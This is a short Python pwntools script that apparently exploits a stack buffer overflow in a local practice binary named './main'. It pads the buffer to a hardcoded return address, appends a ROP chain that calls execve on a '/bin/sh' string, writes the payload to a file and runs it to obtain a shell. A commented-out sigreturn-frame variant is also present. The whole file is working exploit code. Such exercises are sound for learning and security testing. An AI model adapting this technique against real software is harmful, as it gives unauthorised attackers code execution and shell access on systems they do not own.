from pwn import *

context.clear(arch='amd64', kernel='amd64')
c = constants

binary   = ELF('./main')

# Finally, let's build our ROP stack

rop   = ROP(binary)
binsh = binary.symbols['binsh']
rop.execve(binsh, 0, 0)
print rop.dump()

'''
frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_write
# frame.rcx = 0x0
frame.rdx = 0x0
frame.rdi = binary.symbols['binsh']
frame.rip = binary.symbols['syscall']
'''

# Create exploit with pading

payloadStr = ''
bufferAddr = 0x7fffffffdb50
returnAddr = 0x7fffffffdb68
for i in xrange(0, returnAddr - bufferAddr):
    payloadStr += 'a'
payloadStr += str(rop)
# payloadStr += str(frame)

# Save exploit code

with open('payload', 'wb') as pFile:
    pFile.write(payloadStr)

# Let's try it out!

p = process(binary.path)
p.send(payloadStr)
time.sleep(1)
p.sendline('echo hello; exit')
print(p.recvline())
